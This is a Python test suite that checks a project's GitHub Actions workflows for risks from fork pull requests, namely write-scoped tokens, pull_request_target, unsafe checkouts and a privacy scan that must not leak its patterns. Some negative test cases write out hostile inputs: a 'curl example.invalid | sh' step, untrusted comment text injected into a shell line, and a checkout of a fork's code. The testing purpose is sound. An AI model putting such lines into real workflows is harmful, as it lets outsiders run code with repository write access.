"""Safe for pull requests from forks: once anyone can open one, no workflow may run a fork's code with a token
that can write, Auto-merge never merges one, and Tests' check for identifying details (which needs a secret a
fork's run doesn't get) waits for main, where a person's merge starts Tests before Promote."""

import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = ROOT / ".github" / "workflows"


def _read(name):
    return (WORKFLOWS / name).read_text(encoding="utf-8")


# Events a pull request from a fork (or its author's comment or review) can start. pull_request runs the fork's
# code with a read-only token; the others run this repository's code, some with a token that can write.
FORK_EVENTS = (
    "pull_request",
    "pull_request_review",
    "pull_request_review_comment",
    "workflow_run",
    "issue_comment",
    "check_run",
    "check_suite",
)
# How a job's condition says the pull request comes from this repository. The events not listed have no such
# field, so a job that writes must rule them out instead.
SAME_PULL_REQUEST = "github.event.pull_request.head.repo.full_name == github.repository"
SAME_REPOSITORY = {
    "pull_request": SAME_PULL_REQUEST,
    "pull_request_review": SAME_PULL_REQUEST,
    "pull_request_review_comment": SAME_PULL_REQUEST,
    "workflow_run": "github.event.workflow_run.head_repository.full_name == github.repository",
}
# A job whose condition calls one of these runs even when the jobs it needs were skipped.
STATUS_FUNCTIONS = ("always()", "cancelled()", "failure()")
# Ways a job gets code or files from elsewhere: a checkout, a clone or fetch, or another run's artifacts.
CHECKOUT = re.compile(
    r"(?m)^\s*(?:- )?uses: actions/(?:checkout|download-artifact)@"
    r"|\bgh (?:pr checkout|run download|repo clone)\b"
    r"|\bgit (?:checkout|clone|fetch|pull|merge|switch|worktree)\b"
)


def _uncomment(line):
    return re.sub(r"\s+#.*$", "", line).strip()


def _triggers(text):
    """The events that start a workflow, from `on: x`, `on: [x, y]` or an `on:` block."""
    m = re.search(r"(?m)^on:(.*)\n((?:[ #].*\n|\n)*)", text)
    if not m:
        return set()
    inline = _uncomment(m.group(1))
    if inline:
        return set(re.findall(r"[\w-]+", inline))
    return set(re.findall(r"(?m)^  ([\w-]+):", m.group(2)))


def _job_bodies(text):
    """Each job's name and the lines under it."""
    m = re.search(r"(?m)^jobs:\n((?:[ #].*\n|\n)+)", text)
    if not m:
        return {}
    parts = re.split(r"(?m)^  ([\w-]+):[ \t]*(?:#.*)?\n", m.group(1))
    return dict(zip(parts[1::2], parts[2::2]))


def _permissions(text, indent):
    """The permissions set at this indent (the workflow's at "", a job's at four spaces), or None if unset."""
    m = re.search(rf"(?m)^{indent}permissions:(.*)\n((?:{indent}  .*\n)*)", text)
    if not m:
        return None
    return " ".join(_uncomment(line) for line in [m.group(1), *m.group(2).splitlines()])


def _condition(body):
    """A job's `if:`, one line or folded, without `${{ }}`."""
    m = re.search(r"(?m)^    if:[ \t]*(.*)\n((?:      .*\n)*)", body)
    if not m:
        return ""
    first = m.group(1).strip()
    cond = " ".join(line.strip() for line in m.group(2).splitlines()) if first[:1] in (">", "|") else first
    return re.sub(r"^\$\{\{\s*(.*?)\s*\}\}$", r"\1", cond.strip())


def _needs(body):
    m = re.search(r"(?m)^    needs:[ \t]*(.*)$", body)
    return [n.strip() for n in m.group(1).strip("[] ").split(",") if n.strip()] if m else []


def _guarded(job, event, jobs, seen=()):
    """Whether this job can't run for a fork's `event`: its condition requires this repository, rules the
    event out, or it needs a job that does (and runs only when that job succeeded)."""
    cond = _condition(jobs[job])
    parts = set() if "||" in cond else {p.strip() for p in cond.split("&&")}
    if SAME_REPOSITORY.get(event) in parts or f"github.event_name != '{event}'" in parts:
        return True
    for part in parts:
        other = re.fullmatch(r"github\.event_name == '([\w-]+)'", part)
        if other and other.group(1) != event:
            return True
    if any(f in cond for f in STATUS_FUNCTIONS):
        return False
    return any(_guarded(n, event, jobs, (*seen, job)) for n in _needs(jobs[job]) if n in jobs and n not in seen)


# issue_comment's payload doesn't say whether a comment is on a fork's pull request, so no condition can rule one
# out. A job listed here may write on it, because it only edits the comment's own text, checks out nothing but main
# and puts nothing from the event into a shell line (_runs_only_main). Each entry says what the job does.
COMMENT_JOBS = {
    ("strip-footer.yml", "comment"),  # removes the coding tool's footer from the comment's text
}
RUN_BLOCK = re.compile(r"(?m)^( *)(?:- )?run:[ \t]*(.*)\n((?:\1  .*\n|\n)*)")


def _runs_only_main(body):
    """Whether a job does nothing beyond checking out main (no other repository) and running one script from it,
    with no `${{ }}` in the shell line and no permission but `contents: read` (the checkout) and `issues: write`."""
    steps = re.split(r"(?m)^ *- ", body)[1:]
    for step in steps:
        used = re.search(r"(?m)^ *uses: (\S+)", step)
        if used and not used.group(1).startswith("actions/checkout@"):
            return False
        if used and (not re.search(r"(?m)^ *ref: main$", step) or re.search(r"(?m)^ *repository:", step)):
            return False
    runs = [m.group(2) + m.group(3) for m in RUN_BLOCK.finditer(body)]
    if len(runs) != 1 or "${{" in runs[0] or not re.fullmatch(r"python3 \.github/scripts/[\w-]+\.py\s*", runs[0]):
        return False
    return (_permissions(body, "    ") or "").split() == ["contents:", "read", "issues:", "write"]


def fork_problems(workflows):
    """What would let a pull request from a fork run code with a token that can write, for workflows given as
    {file name: text}. A job writes when its permissions (or else the workflow's) grant any write scope, or
    when none are set, since the default token may write."""
    problems = []
    for name, text in sorted(workflows.items()):
        triggers = _triggers(text)
        code = "\n".join(line for line in text.splitlines() if not line.lstrip().startswith("#"))
        if "pull_request_target" in triggers or "pull_request_target" in code:
            problems.append(f"{name}: uses pull_request_target")
        jobs = _job_bodies(text)
        top = _permissions(text.split("\njobs:", 1)[0] + "\n", "")
        for job, body in jobs.items():
            if "workflow_run" in triggers:
                if CHECKOUT.search(body):
                    problems.append(f"{name}: {job} checks out code in a workflow_run job")
                called = re.search(r"(?m)^    uses: \./\.github/workflows/(\S+)$", body)
                if called and called.group(1) in workflows:
                    for step in re.split(r"(?m)^\s*- ", workflows[called.group(1)])[1:]:
                        hit = CHECKOUT.search("- " + step)
                        ref = re.search(r"(?m)^\s*ref: (.*)$", step)
                        # A checkout of a fixed commit (the caller's input, or main) is the one thing allowed.
                        fixed = hit and "checkout@" in hit.group(0) and ref and "github.event" not in ref.group(1)
                        if hit and not fixed:
                            problems.append(f"{name}: {job} calls {called.group(1)}, which checks out the event's code")
            perms = _permissions(body, "    ")
            perms = top if perms is None else perms
            if perms is not None and "write" not in perms:
                continue
            for event in sorted(triggers & set(FORK_EVENTS)):
                if event == "issue_comment" and (name, job) in COMMENT_JOBS and _runs_only_main(body):
                    continue
                if not _guarded(job, event, jobs):
                    problems.append(f"{name}: {job} can write on a fork's {event} without the same repository check")
    return problems


READ_ONLY_PR = """\
name: Example
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@0000000000000000000000000000000000000000 # v1
      - run: make test
"""
LABEL_PR = """\
name: Example
on: [pull_request]
permissions:
  pull-requests: write
jobs:
  label:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit --add-label example
"""
AFTER_TESTS = """\
name: Example
on:
  workflow_run:
    workflows: [Tests]
    types: [completed]
permissions: {}
jobs:
  merge:
    if: >-
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.head_repository.full_name == github.repository
    runs-on: ubuntu-latest
    permissions:
      contents: write    # merge
    steps:
      - run: gh pr merge --squash
  release:
    needs: [merge]
    uses: ./.github/workflows/called.yml
    permissions:
      contents: write
"""
CALLED = """\
name: Called
on:
  workflow_call:
permissions: {}
jobs:
  promote:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@0000000000000000000000000000000000000000 # v1
        with:
          ref: ${{ inputs.sha || github.sha }}
      - run: git push origin HEAD:refs/heads/stable
"""


class ForkPullRequestTests(unittest.TestCase):
    """Once anyone can open a pull request from a fork, no workflow may run its code with a token that can write."""

    def test_the_workflows_here_are_safe_for_forks(self):
        workflows = {path.name: path.read_text(encoding="utf-8") for path in WORKFLOWS.glob("*.y*ml")}
        self.assertGreater(len(workflows), 5)
        for name, text in workflows.items():
            with self.subTest(workflow=name):  # a workflow the checker can't read must not pass unread
                self.assertTrue(_triggers(text), "no trigger found")
                self.assertTrue(_job_bodies(text), "no job found")
        self.assertEqual(fork_problems(workflows), [])

    def test_safe_examples_pass(self):
        self.assertEqual(fork_problems({"a.yml": READ_ONLY_PR, "b.yml": LABEL_PR, "c.yml": AFTER_TESTS, "called.yml": CALLED}), [])

    def test_pull_request_target_fails(self):
        for on in ("on: pull_request_target\n", "on: [push, pull_request_target]\n", "on:\n  pull_request_target:\n"):
            with self.subTest(on=on):
                text = READ_ONLY_PR.replace("on:\n  pull_request:\n", on)
                self.assertEqual(fork_problems({"a.yml": text}), ["a.yml: uses pull_request_target"])

    def test_a_workflow_run_job_that_checks_out_code_fails(self):
        step = "      - run: gh pr merge --squash\n"
        for checkout in (
            "      - uses: actions/checkout@0000000000000000000000000000000000000000 # v1\n",
            "      - uses: actions/download-artifact@0000000000000000000000000000000000000000 # v1\n",
            "      - run: gh pr checkout 1\n",
            '      - run: gh run download "$RUN_ID"\n',
            '      - run: gh repo clone "$REPO"\n',
            '      - run: git fetch origin "$BRANCH"\n',
            '      - run: git pull origin "$BRANCH"\n',
            '      - run: git merge "$SHA"\n',
        ):
            with self.subTest(checkout=checkout):
                text = AFTER_TESTS.replace(step, checkout + step)
                self.assertEqual(
                    fork_problems({"c.yml": text, "called.yml": CALLED}),
                    ["c.yml: merge checks out code in a workflow_run job"],
                )

    def test_a_workflow_run_job_calling_a_workflow_that_checks_out_the_event_fails(self):
        for ref in ("${{ github.event.workflow_run.head_sha }}", None):
            with self.subTest(ref=ref):
                line = "          ref: ${{ inputs.sha || github.sha }}\n"
                called = CALLED.replace(line, f"          ref: {ref}\n" if ref else "")
                self.assertEqual(
                    fork_problems({"c.yml": AFTER_TESTS, "called.yml": called}),
                    ["c.yml: release calls called.yml, which checks out the event's code"],
                )

    def test_a_job_that_writes_without_the_same_repository_check_fails(self):
        guard = "    if: github.event.pull_request.head.repo.full_name == github.repository\n"
        for cond in (
            "",
            "    if: github.event.pull_request.draft == false\n",
            "    if: github.actor == 'example' || " + guard.split(": ", 1)[1],
        ):
            with self.subTest(cond=cond):
                text = LABEL_PR.replace(guard, cond)
                self.assertEqual(
                    fork_problems({"b.yml": text}),
                    ["b.yml: label can write on a fork's pull_request without the same repository check"],
                )

    def test_writing_is_judged_from_the_job_then_the_workflow_then_the_default_token(self):
        write = "permissions:\n  contents: read\n"
        for perms in ("permissions:\n  contents: write\n", "permissions: write-all\n", ""):
            with self.subTest(perms=perms):
                problems = fork_problems({"a.yml": READ_ONLY_PR.replace(write, perms)})
                self.assertEqual(problems, ["a.yml: test can write on a fork's pull_request without the same repository check"])
        job = "    runs-on: ubuntu-latest\n"
        text = READ_ONLY_PR.replace(job, job + "    permissions:\n      issues: write\n", 1)
        self.assertEqual(len(fork_problems({"a.yml": text})), 1)

    def test_a_job_after_a_checked_one_passes_unless_it_runs_regardless(self):
        self.assertEqual(fork_problems({"c.yml": AFTER_TESTS, "called.yml": CALLED}), [])
        text = AFTER_TESTS.replace("    needs: [merge]\n", "    needs: [merge]\n    if: ${{ !cancelled() }}\n")
        self.assertEqual(
            fork_problems({"c.yml": text, "called.yml": CALLED}),
            ["c.yml: release can write on a fork's workflow_run without the same repository check"],
        )

    def test_a_job_that_rules_out_the_event_passes(self):
        guard = "    if: github.event.pull_request.head.repo.full_name == github.repository\n"
        for cond in ("github.event_name != 'pull_request'", "github.ref == 'refs/heads/main' && github.event_name == 'push'"):
            with self.subTest(cond=cond):
                text = LABEL_PR.replace("on: [pull_request]", "on: [pull_request, push]").replace(guard, f"    if: {cond}\n")
                self.assertEqual(fork_problems({"b.yml": text}), [])

    def test_comments_reviews_and_checks_count_as_fork_events(self):
        guard = "    if: github.event.pull_request.head.repo.full_name == github.repository\n"
        for event in ("issue_comment", "check_run", "check_suite"):
            with self.subTest(event=event):
                text = LABEL_PR.replace("on: [pull_request]", f"on: [{event}]")
                self.assertEqual(
                    fork_problems({"b.yml": text}),
                    [f"b.yml: label can write on a fork's {event} without the same repository check"],
                )
                ruled_out = text.replace(guard, f"    if: github.event_name != '{event}'\n")
                self.assertEqual(fork_problems({"b.yml": ruled_out}), [])
        for event in ("pull_request_review", "pull_request_review_comment"):
            with self.subTest(event=event):
                text = LABEL_PR.replace("on: [pull_request]", f"on: [{event}]")
                self.assertEqual(fork_problems({"b.yml": text}), [])
                self.assertEqual(len(fork_problems({"b.yml": text.replace(guard, "")})), 1)


COMMENT_WORKFLOW = """\
name: Example
on:
  issue_comment:
permissions: {}
jobs:
  comment:
    if: github.event_name == 'issue_comment'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      issues: write
    steps:
      - uses: actions/checkout@0000000000000000000000000000000000000000 # v1
        with:
          ref: main
      - env:
          TEXT: ${{ github.event.comment.body }}
        run: python3 .github/scripts/script.py
"""


class CommentJobTests(unittest.TestCase):
    """A job on issue_comment can't tell a fork's pull request from its payload: only a listed job that runs
    nothing from the event may write there."""

    def check(self, text, name="strip-footer.yml"):
        return fork_problems({name: text})

    def test_the_footer_job_here_is_the_one_listed(self):
        self.assertEqual(COMMENT_JOBS, {("strip-footer.yml", "comment")})
        self.assertEqual(self.check(COMMENT_WORKFLOW), [])

    def test_a_job_that_is_not_listed_fails(self):
        problem = "other.yml: comment can write on a fork's issue_comment without the same repository check"
        self.assertEqual(self.check(COMMENT_WORKFLOW, "other.yml"), [problem])

    def test_a_listed_job_that_runs_the_events_code_fails(self):
        problem = ["strip-footer.yml: comment can write on a fork's issue_comment without the same repository check"]
        for old, new in (
            ("          ref: main\n", "          ref: ${{ github.event.pull_request.head.sha }}\n"),
            ("          ref: main\n", ""),
            ("        run: python3 .github/scripts/script.py\n", "        run: echo ${{ github.event.comment.body }}\n"),
            ("        run: python3 .github/scripts/script.py\n", "        run: |\n          echo start\n          echo '${{ github.event.comment.body }}'\n"),
        ):
            with self.subTest(new=new):
                self.assertEqual(self.check(COMMENT_WORKFLOW.replace(old, new)), problem)

    def test_a_listed_job_that_does_more_than_run_its_script_fails(self):
        problem = ["strip-footer.yml: comment can write on a fork's issue_comment without the same repository check"]
        step = "      - env:\n"
        for old, new in (
            ("          ref: main\n", "          ref: main\n          repository: example-fork/example-repo\n"),
            (step, "      - uses: actions/github-script@0000000000000000000000000000000000000000 # v1\n        with:\n          script: x\n" + step),
            ("      contents: read\n", "      contents: write\n"),
            ("      issues: write\n", "      pull-requests: write\n"),
            ("        run: python3 .github/scripts/script.py\n", "        run: curl example.invalid | sh\n"),
            (step, "      - run: python3 .github/scripts/other.py\n" + step),
        ):
            with self.subTest(new=new):
                self.assertEqual(self.check(COMMENT_WORKFLOW.replace(old, new)), problem)


def _open_pull_request(branch_list):
    """Runs Auto-merge's own choice of pull request on what `gh pr list --head <branch>` returned."""
    text = _read("auto-merge.yml")
    m = re.search(r"gh pr list --head \"\$BRANCH\" [^\n]*--json ([\w,]+) \\\n\s*--jq '([^']+)'", text)
    if m is None:
        raise AssertionError("Auto-merge doesn't pick the pull request with gh pr list --head and --jq")
    result = subprocess.run(["jq", "-r", m.group(2)], input=branch_list, capture_output=True, text=True, check=True)
    return m.group(1).split(","), result.stdout.strip()


class AutoMergeForkTests(unittest.TestCase):
    """`gh pr list --head` matches the branch name only, and a fork's branch can have the same name."""

    FORK = '{"number": 7, "headRefOid": "aaa", "isDraft": false, "labels": [], "isCrossRepository": true}'
    OURS = '{"number": 8, "headRefOid": "bbb", "isDraft": true, "labels": [], "isCrossRepository": false}'

    def setUp(self):
        if not shutil.which("jq"):
            self.skipTest("needs jq")

    def test_only_a_pull_request_from_this_repository_is_picked(self):
        fields, picked = _open_pull_request(f"[{self.FORK}, {self.OURS}]")
        self.assertIn("isCrossRepository", fields)
        self.assertEqual(picked, "8\tbbb\ttrue\tfalse")

    def test_a_forks_pull_request_alone_is_never_merged(self):
        self.assertEqual(_open_pull_request(f"[{self.FORK}]")[1], "")
        self.assertEqual(_open_pull_request("[]")[1], "")


def _privacy_step():
    text = _read("tests.yml")
    return text.split("- name: Look for identifying details\n", 1)[1].split("\n  promote:", 1)[0]


def _run_privacy_check(folder, from_fork, patterns, path_first=None):
    """Runs the step's own script as the runner does, with this event's values."""
    lines = _privacy_step().split("        run: |\n", 1)[1].splitlines()
    script = "\n".join(line[10:] for line in lines) + "\n"
    return subprocess.run(
        # As the runner runs a step without a shell: key (bash -e {0}), so without pipefail.
        ["bash", "--noprofile", "--norc", "-e", "-c", script],
        cwd=folder,
        env={
            "PATH": ":".join(filter(None, [path_first, str(Path(sys.executable).parent), "/usr/bin", "/bin"])),
            "GITHUB_WORKSPACE": str(ROOT),
            "RUNNER_TEMP": folder,
            "GITHUB_STEP_SUMMARY": str(Path(folder) / "summary.md"),
            "PATTERNS": patterns,
            "FROM_FORK": from_fork,
        },
        capture_output=True,
        text=True,
        check=False,
    )


class PrivacyCheckOnForksTests(unittest.TestCase):
    """A fork's pull request gets no secrets: the identifying-details check waits for main, where a person's
    merge starts Tests (and Promote only after it)."""

    def test_the_step_knows_a_fork_from_the_event(self):
        step = _privacy_step()
        self.assertIn(
            "FROM_FORK: ${{ github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository }}",
            step,
        )
        self.assertIn("PATTERNS: ${{ secrets.PRIVACY_PATTERNS }}", step)

    def test_a_fork_is_skipped_with_a_notice(self):
        with tempfile.TemporaryDirectory() as folder:
            for patterns in ("", "example-place"):
                with self.subTest(patterns=patterns):
                    result = _run_privacy_check(folder, "true", patterns)
                    self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                    self.assertRegex(result.stdout, r"(?m)^::notice::.*fork.*\bmain\b")
                    # The run's summary says so too, for the person who reviews and merges it.
                    summary = (Path(folder) / "summary.md").read_text(encoding="utf-8")
                    self.assertRegex(summary, r"identifying details.*not run")

    def test_this_repository_without_the_secret_still_fails(self):
        with tempfile.TemporaryDirectory() as folder:
            result = _run_privacy_check(folder, "false", "")
        self.assertEqual(result.returncode, 1)
        self.assertIn("::error::The repo secret PRIVACY_PATTERNS is not set.", result.stdout)

    def test_this_repository_with_the_secret_finds_a_match_by_file_and_line(self):
        if not shutil.which("git"):
            self.skipTest("needs git")
        with tempfile.TemporaryDirectory() as folder:
            subprocess.run(["git", "init", "-q", folder], check=True)
            (Path(folder) / "notes.txt").write_text("nothing here\nnear Example-Place\n", encoding="utf-8")
            subprocess.run(["git", "-C", folder, "add", "notes.txt"], check=True)
            subprocess.run(["git", "-C", folder, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "init"], check=True)
            clean = _run_privacy_check(folder, "false", "another-place")
            found = _run_privacy_check(folder, "false", "example-place")
        self.assertEqual(clean.returncode, 0, clean.stdout + clean.stderr)
        self.assertEqual(found.returncode, 1)
        self.assertIn("notes.txt:2", found.stdout)
        self.assertNotIn("Example-Place", found.stdout)

    def test_an_invalid_pattern_stops_it_by_line_without_quoting_it(self):
        # git grep's own error quotes the pattern, and the log, an annotation or the summary would show it.
        if not shutil.which("git"):
            self.skipTest("needs git")
        with tempfile.TemporaryDirectory() as folder:
            subprocess.run(["git", "init", "-q", folder], check=True)
            (Path(folder) / "notes.txt").write_text("nothing here\n", encoding="utf-8")
            subprocess.run(["git", "-C", folder, "add", "notes.txt"], check=True)
            for bad in ("example-(place", "example-place{1"):
                with self.subTest(bad=bad):
                    result = _run_privacy_check(folder, "false", f"another-place\r\n\n{bad}")
                    output = result.stdout + result.stderr
                    self.assertEqual(result.returncode, 1, output)
                    self.assertIn("::error::Line 3 of the patterns isn't a valid extended regular expression", output)
                    self.assertNotIn("example-place", output.lower())
                    self.assertFalse((Path(folder) / "summary.md").exists())

    def test_a_failed_search_stops_it_without_showing_gits_error(self):
        # A git whose search fails with an error quoting a pattern, as git grep does; anything else is the real git.
        real_git = shutil.which("git")
        if not real_git:
            self.skipTest("needs git")
        with tempfile.TemporaryDirectory() as folder, tempfile.TemporaryDirectory() as tools:
            subprocess.run(["git", "init", "-q", folder], check=True)
            (Path(folder) / "notes.txt").write_text("nothing here\n", encoding="utf-8")
            subprocess.run(["git", "-C", folder, "add", "notes.txt"], check=True)
            fake = Path(tools) / "git"
            fake.write_text(
                f"#!/bin/sh\nif [ \"$1\" = grep ] && [ \"$2\" = --no-color ]; then echo \"fatal: example-place broke\" >&2; exit 128; fi\nexec \"{real_git}\" \"$@\"\n",
                encoding="utf-8",
            )
            fake.chmod(0o755)
            result = _run_privacy_check(folder, "false", "example-place", path_first=tools)
        output = result.stdout + result.stderr
        self.assertEqual(result.returncode, 1, output)
        self.assertIn("::error::A pattern isn't a valid extended regular expression, or the search failed.", output)
        self.assertEqual(output.count("search failed"), 1, output)
        self.assertNotIn("example-place", output)
        self.assertNotIn("No identifying details found", output)

    def test_a_path_that_matches_is_counted_but_never_printed(self):
        if not shutil.which("git"):
            self.skipTest("needs git")
        with tempfile.TemporaryDirectory() as folder:
            subprocess.run(["git", "init", "-q", folder], check=True)
            (Path(folder) / "example-hamlet.txt").write_text("nothing here\n", encoding="utf-8")
            (Path(folder) / "notes.txt").write_text("fine\nExample-Hamlet\n", encoding="utf-8")
            subprocess.run(["git", "-C", folder, "add", "."], check=True)
            subprocess.run(
                ["git", "-c", "user.name=Example", "-c", "user.email=example@example.invalid", "-C", folder, "commit", "-q", "-m", "start"],
                check=True,
            )
            result = _run_privacy_check(folder, "false", "example-hamlet")
        output = result.stdout + result.stderr
        self.assertEqual(result.returncode, 1, output)
        self.assertNotIn("example-hamlet.txt", output.lower())
        self.assertIn("1 file path(s) that match", output)
        self.assertIn("notes.txt:2", output)
        self.assertNotIn("No identifying details found", output)

    def test_dependabot_still_skips_it_and_release_still_needs_it(self):
        self.assertIn("if: github.actor != 'dependabot[bot]'", _privacy_step())
        self.assertRegex(_read("tests.yml"), r"(?m)^    needs: \[test\]$")


class ForkDocsTests(unittest.TestCase):
    def test_contributing_says_what_happens_to_a_forks_pull_request(self):
        text = (ROOT / "CONTRIBUTING.md").read_text(encoding="utf-8")
        section = text.split("## Pull requests from forks\n", 1)
        self.assertEqual(len(section), 2, "CONTRIBUTING.md has no section on pull requests from forks")
        section = section[1].split("\n## ", 1)[0]
        for words in ("approv", "setting", "Auto-merge never merges", "by hand", "PRIVACY_PATTERNS", "`main`", "not run"):
            self.assertIn(words, section)


if __name__ == "__main__":
    unittest.main()
